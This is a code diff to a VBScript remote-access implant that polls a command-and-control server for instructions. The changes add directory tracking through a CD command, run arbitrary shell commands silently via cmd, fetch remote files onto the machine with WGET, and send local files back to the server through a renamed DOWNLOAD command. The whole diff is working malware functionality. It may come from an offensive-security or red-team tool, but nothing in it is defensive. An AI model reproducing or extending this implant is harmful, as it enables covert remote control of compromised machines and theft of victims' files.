@@ -26,11 +26,12 @@ If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP")
 Dim arrSplitUrl, strFilename, stream
 
 ' Configuration
-Dim strHost, strPort, strUrl, intSleep
+Dim strHost, strPort, strUrl, strCD, intSleep
 strHost = "127.0.0.1"
 strPort = "8080"
 intSleep = 5000
 strUrl = "http://" & strHost & ":" & strPort
+strCD =  "."
 
 ' Periodically poll for commands
 Dim strInfo
@@ -48,6 +49,12 @@ While True
     strArgument = ""
     If UBound(arrResponseText) > 0 Then
         strArgument = arrResponseText(1)
+    End If
+
+    ' Fix ups
+    If strCommand = "PWD" Or strCommand = "GETWD" Then
+        strCommand = "CD"
+        strArgument = ""
     End If
 
     ' Execute command
@@ -161,7 +168,7 @@ While True
         Case "SHELL"
             'Execute and write to file
             Dim strOutFile: strOutFile = fs.GetSpecialFolder(2) & "\rso.txt"
-            shell.Run "cmd /C " & strArgument & "> """ & strOutFile & """ 2>&1", 0, True
+            shell.Run "cmd /C pushd """ & strCD & """ && " & strArgument & "> """ & strOutFile & """ 2>&1", 0, True
 
             ' Read out file
             Dim file: Set file = fs.OpenTextFile(strOutfile, 1)
@@ -181,11 +188,26 @@ While True
             strOutFile = Empty
             text = Empty
 
+        ' Change Directory
+        Case "CD"
+            ' Only change directory when argument is provided
+            If Len(strArgument) > 0 Then
+                Dim strNewCdPath
+                strNewCdPath = GetAbsolutePath(strArgument)
+
+                If fs.FolderExists(strNewCdPath) Then
+                    strCD = strNewCdPath
+                End If
+            End If
+
+            SendStatusUpdate strRawCommand, strCD
+
         ' Download a file from a URL
         Case "WGET"
             ' Determine filename
             arrSplitUrl = Split(strArgument, "/")
             strFilename = arrSplitUrl(UBound(arrSplitUrl))
+            strFilename = GetAbsolutePath(strFilename)
 
             ' Fetch file
             Err.Clear() ' Set error number to 0
@@ -213,18 +235,21 @@ While True
             strFilename = Empty
 
         ' Send a file to the server
-        Case "GET"
+        Case "DOWNLOAD"
+            Dim strFullSourceFilePath
+            strFullSourceFilePath = GetAbsolutePath(strArgument)
+
             ' Only download if file exists
-            If fs.FileExists(strArgument) Then
+            If fs.FileExists(strFullSourceFilePath) Then
                 ' Determine filename
-                arrSplitUrl = Split(strArgument, "\")
+                arrSplitUrl = Split(strFullSourceFilePath, "\")
                 strFilename = arrSplitUrl(UBound(arrSplitUrl))
 
                 ' Read the file to memory
                 Set stream = CreateObject("Adodb.Stream")
                 stream.Type = 1 ' adTypeBinary
                 stream.Open
-                stream.LoadFromFile strArgument
+                stream.LoadFromFile strFullSourceFilePath
                 Dim binFileContents
                 binFileContents = stream.Read
 
@@ -235,12 +260,13 @@ While True
                 binFileContents = Empty
             ' File does not exist
             Else
-                SendStatusUpdate strRawCommand, "File does not exist: " & strArgument
+                SendStatusUpdate strRawCommand, "File does not exist: " & strFullSourceFilePath
             End If
 
             ' Clean up
             arrSplitUrl = Array()
             strFilename = Empty
+            strFullSourceFilePath = Empty
 
         ' Self-destruction, exits script
         Case "KILL"
@@ -266,6 +292,25 @@ Function PadRight(strInput, intLength)
     strOutput = LEFT(strInput & Space(intLength), intLength)
     strOutput = LEFT(strOutput & String(intLength, " "), intLength)
     PadRight = strOutput
+End Function
+
+
+Function GetAbsolutePath(strPath)
+    Dim strOutputPath
+    strOutputPath = ""
+
+    ' Use backslashes
+    strPath = Replace(strPath, "/", "\")
+
+    ' Absolute paths : \Windows C:\Windows D:\
+    ' Relative paths: .. ..\ .\dir .\dir\ dir dir\ dir1\dir2 dir1\dir2\
+    If Left(strPath, 1) = "\" Or InStr(1, strPath, ":") <> 0 Then
+        strOutputPath = strPath
+    Else
+        strOutputPath = strCD & "\" & strPath
+    End If
+
+    GetAbsolutePath = fs.GetAbsolutePathName(strOutputPath)
 End Function
 
 
